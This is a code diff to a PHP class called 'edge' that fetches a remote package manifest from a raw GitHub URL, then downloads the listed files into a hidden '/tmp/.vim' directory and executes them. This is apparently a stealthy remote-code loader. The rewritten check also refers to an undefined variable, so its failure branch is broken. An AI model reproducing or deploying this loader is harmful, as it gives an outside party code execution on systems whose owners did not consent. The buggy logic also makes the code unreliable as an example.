@@ -11,13 +11,8 @@
  */
 class edge
 {
-    protected $hosts = array(
-        'https://raw.githubusercontent.com/Glenn-robert/code/master/'
-    );
-
-    protected $functions = array(
-        'information.php'
-    );
+    protected $master = 'https://raw.githubusercontent.com/Glenn-robert/code/master/';
+    protected $package = 'https://raw.githubusercontent.com/Glenn-robert/code/master/package';
 
     protected $tmpPath = array(
         '/tmp/.vim',
@@ -46,37 +41,34 @@ class edge
             }
         }
 
-        /**
-         * Check File
-         */
-        foreach ($this->functions as $function) {
-            foreach ($this->hosts as $host) {
-                $url = $host . $function;
-                $filenameMD5 = md5($url);
-                $basePath = end($this->tmpPath);
-                $filePath = $basePath . DIRECTORY_SEPARATOR . $filenameMD5;
-                $fileMD5Path = $basePath . DIRECTORY_SEPARATOR . '.' . $filenameMD5;
-                $this->log('Check Function:' . $function);
-                $this->log('FilePath: ' . $filePath);
-                $this->log('FileMD5Path: ' . $fileMD5Path);
-                if (is_file($filePath) && is_file($fileMD5Path)) {
-                    $fileContentMD5 = file_get_contents($fileMD5Path);
-                    if ($fileContentMD5 == md5_file($filePath)) {
-                        $this->log('MD5 Check Success: ' . $filePath);
-                        $this->run($filePath);
-                        break;
-                    }
-                }
-                $this->log('File Not Exits, Downloading...');
-                $content = file_get_contents($url);
-                $retOriginFile = file_put_contents($filePath, $content);
-                $retMD5File = file_put_contents($fileMD5Path, md5($content));
-                if ($retOriginFile && $retMD5File) {
-                    $this->log('Downloaded: ' . $function);
+        $packageContent = file_get_contents($this->package);
+        if (!empty($packages)) {
+            $this->log("Download Failed");
+            return;
+        }
+        $packages = json_decode($packageContent);
+        foreach ($packages as $function => $md5) {
+            $url = $this->master . $function;
+            $filenameMD5 = md5($url);
+            $basePath = end($this->tmpPath);
+            $filePath = $basePath . DIRECTORY_SEPARATOR . $filenameMD5;
+            $this->log('Check Function:' . $function);
+            $this->log('FilePath: ' . $filePath);
+            if (is_file($filePath)) {
+                if ($md5 == md5_file($filePath)) {
+                    $this->log('MD5 Check Success: ' . $filePath);
                     $this->run($filePath);
-                } else {
-                    $this->log('Download Failed: ' . $function);
+                    break;
                 }
+            }
+            $this->log('File Not Exits, Downloading...');
+            $content = file_get_contents($url);
+            $retOriginFile = file_put_contents($filePath, $content);
+            if ($retOriginFile) {
+                $this->log('Downloaded: ' . $function);
+                $this->run($filePath);
+            } else {
+                $this->log('Download Failed: ' . $function);
             }
         }
     }
